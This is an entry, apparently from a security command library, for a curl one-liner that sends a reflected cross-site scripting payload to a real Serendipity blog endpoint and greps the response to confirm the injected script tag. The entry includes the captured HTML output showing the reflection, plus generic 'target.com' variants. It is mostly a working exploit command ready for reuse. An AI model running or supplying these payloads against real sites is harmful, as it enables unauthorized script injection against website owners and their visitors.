---
id: cmd-uuid-2
data: >-
  curl -s --data
  "serendipity%5BisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>"
  "https://blog.fuzzing-project.org/index.php?frontpage" | grep prompt
tags:
  - xss
  - verification
  - http
type: command
output: >-
  <li class="next"><a
  href="https://blog.fuzzing-project.org/categories/1\'\"()&%< ><ScRiPt
  >prompt(1)</ScRiPt>-multi/P2.html">next page &rarr;</a></li>
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.293Z'
verified: false
validated: true
submitted: true
---
# curl-xss-payload-injection-with-grep

## Command

```bash
curl -s --data "serendipity%5BisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>" "https://blog.fuzzing-project.org/index.php?frontpage" | grep prompt
```

## Description

This command sends the XSS payload via curl and uses grep to search the response for the 'prompt' keyword, verifying reflection without full output clutter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` (curl) | Silent mode for curl | Yes |
| `--data` (curl) | POST data with encoded payload | Yes |
| URL (curl) | Target Serendipity endpoint | Yes |
| `prompt` (grep) | String to search for in response | Yes |

## Examples

### Basic Usage

```bash
curl -s --data "...payload..." "https://target.com/index.php?frontpage" | grep prompt
```

### Advanced Usage

```bash
curl -s --data "...payload..." "https://target.com/index.php?frontpage" | grep -i "prompt\|script"
```

## Expected Output

Filtered lines containing 'prompt', showing the reflected script in the HTML, e.g., the pagination <a> tag with injected code.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-Serendipity-multiCat]]
